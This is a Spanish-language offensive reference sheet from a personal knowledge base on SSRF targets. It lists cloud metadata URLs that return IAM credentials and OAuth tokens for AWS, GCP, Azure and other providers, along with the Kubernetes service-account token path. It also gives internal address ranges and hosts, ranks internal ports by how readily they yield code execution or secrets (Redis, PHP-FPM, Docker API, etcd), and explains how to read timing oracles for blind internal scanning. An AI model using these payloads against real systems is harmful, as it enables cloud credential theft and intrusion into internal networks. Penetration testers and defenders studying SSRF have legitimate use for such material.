---
tipo: meta
aliases:
  - Destinos SSRF
  - IMDS - rutas
  - Puertos internos
tags:
  - meta/referencia
  - dominio/web
---

# SSRF destinos - matriz de referencia

> [!info] Referencia pura, no un zettel
> A dónde apuntar, en orden de retorno decreciente. El criterio está en [[MOC - SSRF]]; las formas de escribir estas direcciones cuando hay filtro, en [[SSRF evasión - matriz de referencia]].

## 1. Metadatos de instancia — probar siempre primero

Una petición, credenciales. Ver [[SSRF - metadatos de instancia cloud]].

**AWS** — `169.254.169.254`

`http://169.254.169.254/latest/meta-data/`
Índice. Confirma que hay IMDS y que responde.

`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
Nombre del rol. Devuelve una línea.

`http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol>`
**Las credenciales**: `AccessKeyId`, `SecretAccessKey`, `Token`. El objetivo.

`http://169.254.169.254/latest/user-data`
Datos de arranque. Secretos incrustados con muchísima frecuencia.

IMDSv2 exige token previo, y por eso corta el SSRF simple:

```http
PUT /latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
Después, `X-aws-ec2-metadata-token: <token>` en cada `GET`. Un SSRF que solo controla la URL no puede hacer un `PUT` ni poner cabeceras: hace falta control del método, o `gopher`.

**GCP** — `metadata.google.internal` o `169.254.169.254`, con cabecera `Metadata-Flavor: Google`

`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
Token OAuth de la cuenta de servicio.

`http://metadata.google.internal/computeMetadata/v1/project/attributes/`
Atributos del proyecto, incluidas claves SSH.

**Azure** — `169.254.169.254`, con cabecera `Metadata: true`

`http://169.254.169.254/metadata/instance?api-version=2021-02-01`
`http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

**Otros**

`http://169.254.169.254/metadata/v1.json`
DigitalOcean. Sin cabecera: el más fácil de los que quedan.

`http://100.100.100.200/latest/meta-data/`
Alibaba Cloud. Dirección distinta, que muchas listas negras no incluyen.

`http://169.254.169.254/opc/v2/instance/`
Oracle Cloud. Requiere `Authorization: Bearer Oracle`.

**Kubernetes** — el equivalente no es una URL

`https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
API del clúster. El token está en el sistema de archivos, no en metadatos:

`file:///var/run/secrets/kubernetes.io/serviceaccount/token`

## 2. Loopback y rangos internos

```
127.0.0.0/8      loopback
10.0.0.0/8       privado
172.16.0.0/12    privado — el rango de Docker por defecto vive acá
192.168.0.0/16   privado
169.254.0.0/16   enlace local — metadatos
::1              loopback IPv6
```

Hosts que vale la pena probar antes de barrer nada:

```
127.0.0.1  localhost  0.0.0.0  ::1
host.docker.internal      desde un contenedor hacia el anfitrión
172.17.0.1                gateway de Docker por defecto
kubernetes.default.svc    API del clúster
```

## 3. Puertos que pagan

Barrer 65535 puertos es caro e innecesario. Estos son los que convierten un SSRF en algo:

| Puerto | Servicio | Por qué importa |
|---|---|---|
| 6379 | Redis | Escritura de archivos → RCE, casi nunca autentica |
| 9000 | PHP-FPM | FastCGI → ejecución directa |
| 11211 | memcached | Sin autenticación por defecto |
| 2375 | API de Docker | Sin TLS ni autenticación: control del anfitrión |
| 10250 | kubelet | Ejecución en pods |
| 2379 | etcd | Todos los secretos del clúster |
| 8500 | Consul | Registro de servicios y KV |
| 9200 | Elasticsearch | Lectura de todos los índices |
| 27017 | MongoDB | Frecuentemente sin autenticación |
| 3306 · 5432 | MySQL · PostgreSQL | Requieren protocolo binario: solo vía `gopher` |
| 8080 · 8000 · 3000 | Paneles internos | Administración sin autenticar detrás del perímetro |
| 15672 | RabbitMQ | Panel de administración |
| 9090 · 3000 | Prometheus · Grafana | Topología completa de la infraestructura |
| 5000 | Registro de contenedores | Imágenes con secretos dentro |

Los primeros cinco son los que dan ejecución; el resto, lectura. Ver [[SSRF - gopher a servicio interno]].

## 4. Interpretar el oráculo

Para [[SSRF - escaneo de la red interna]], sin ver la respuesta:

| Observación | Qué significa |
|---|---|
| Error inmediato de conexión | Puerto **cerrado**, host vivo |
| Tiempo de espera agotado | Puerto **filtrado**, o host inexistente |
| Error de parseo, rápido | Puerto **abierto**, otro protocolo |
| Respuesta normal | Puerto **abierto**, HTTP |

La diferencia entre las dos primeras filas es lo que permite distinguir un host que existe de uno que no, y es la base del mapeo. Si el cliente HTTP no expone esa diferencia, el escaneo pierde la mitad de su valor.
